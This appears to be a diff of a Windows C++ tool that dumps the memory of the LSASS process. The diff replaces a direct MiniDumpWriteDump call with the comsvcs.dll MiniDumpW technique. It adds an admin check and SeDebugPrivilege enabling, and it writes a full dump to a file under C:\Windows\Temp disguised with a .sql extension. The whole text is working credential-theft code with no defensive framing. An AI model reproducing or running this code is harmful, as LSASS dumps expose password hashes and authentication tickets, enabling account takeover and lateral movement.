@@ -5,9 +5,37 @@
 #include <iostream>
 #include <TlHelp32.h>
 #pragma comment( lib, "Dbghelp.lib" )
+#define _CRT_SECURE_NO_WARNINGS
 
-bool EnableDebugPrivilege()
+typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
+
+BOOL CheckPrivilege() {
+    BOOL state;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    PSID AdministratorsGroup;
+   
+    state = AllocateAndInitializeSid(
+        &NtAuthority,
+        2,
+        SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS,
+        SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS,0, 0, 0, 0,
+        &AdministratorsGroup);
+    if (state)
+    {
+        if (!CheckTokenMembership(NULL, AdministratorsGroup, &state))
+        {
+            state = FALSE;
+        }
+        FreeSid(AdministratorsGroup);
+    }
+
+    return state;
+}
+
+BOOL EnableDebugPrivilege()
 {
+    
     HANDLE hThis = GetCurrentProcess();
     HANDLE hToken;
     OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, &hToken);
@@ -17,36 +45,17 @@ bool EnableDebugPrivilege()
     priv.PrivilegeCount = 1;
     priv.Privileges[0].Luid = luid;
     priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    AdjustTokenPrivileges(hToken, false, &priv, sizeof(priv), 0, 0);
-    CloseHandle(hToken);
-    CloseHandle(hThis);
-    return true;
+    BOOL isEnabiled = AdjustTokenPrivileges(hToken, false, &priv, sizeof(priv), 0, 0);
+    if (isEnabiled) {
+        CloseHandle(hToken);
+        CloseHandle(hThis);
+        return TRUE;
+    }
+    return FALSE;
 }
 
-void GetErrorMessage() {
-    LPVOID lpMsgBuf;
-    FormatMessage(
-        FORMAT_MESSAGE_ALLOCATE_BUFFER |
-        FORMAT_MESSAGE_FROM_SYSTEM |
-        FORMAT_MESSAGE_IGNORE_INSERTS,
-        NULL,
-        GetLastError(),
-        0, // Default language
-        (LPTSTR)&lpMsgBuf,
-        0,
-        NULL
-    );
-
-    MessageBox(NULL, (LPCTSTR)lpMsgBuf, L"Error", MB_OK | MB_ICONINFORMATION);
-    // Free the buffer.
-    LocalFree(lpMsgBuf);
-}
-
-int Dump() {
-    EnableDebugPrivilege();
+DWORD GetLsassPID() {
     DWORD lsassPID = 0;
-    HANDLE lsassHandle = NULL;
-    HANDLE outFile = CreateFile(L"C:\\Windows\\Temp\\lsass.sql", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 processEntry = {};
     processEntry.dwSize = sizeof(PROCESSENTRY32);
@@ -59,24 +68,44 @@ int Dump() {
             lsassPID = processEntry.th32ProcessID;
         }
     }
-   
-    //调用MiniDumpWriteDump
-    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
-    if (lsassHandle == NULL)
+    return lsassPID;
+}
+
+BOOL CheckFileExists(PWCHAR file) {
+    WIN32_FIND_DATA FindFileData;
+    HANDLE hFind = FindFirstFileEx(file, FindExInfoStandard, &FindFileData,FindExSearchNameMatch, NULL, 0);
+    if (hFind == INVALID_HANDLE_VALUE)
     {
-        GetErrorMessage();
-        wprintf(L" OpenProcess Error : %d \n", GetLastError());
+        return FALSE;
+    }
+    return TRUE;
+}
+int Dump() {
+    WCHAR commandLine[MAX_PATH];
+    WCHAR DumpFile[] = L"C:\\Windows\\Temp\\111.sql";
+    _MiniDumpW MiniDumpW;
+    DWORD lsassPID = 0;
+
+    if (!CheckPrivilege()) {
+        return -1;
     }
 
-    BOOL success = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-    if (success) {
-        wprintf(L"Success!");
+    if (!EnableDebugPrivilege()) {
+        return -1;
+    }
+   
+
+    if (CheckFileExists(DumpFile)) {
         return 0;
     }
-    
-    CloseHandle(lsassHandle);
-    CloseHandle(outFile);
-    GetErrorMessage();
+
+    lsassPID = GetLsassPID();
+    MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
+    _itow_s(lsassPID, commandLine, 10);
+    lstrcatW(commandLine, L" ");
+    lstrcatW(commandLine, DumpFile);
+    lstrcatW(commandLine, L" full");
+    MiniDumpW(0, 0, commandLine);
     return 0;
 }
 
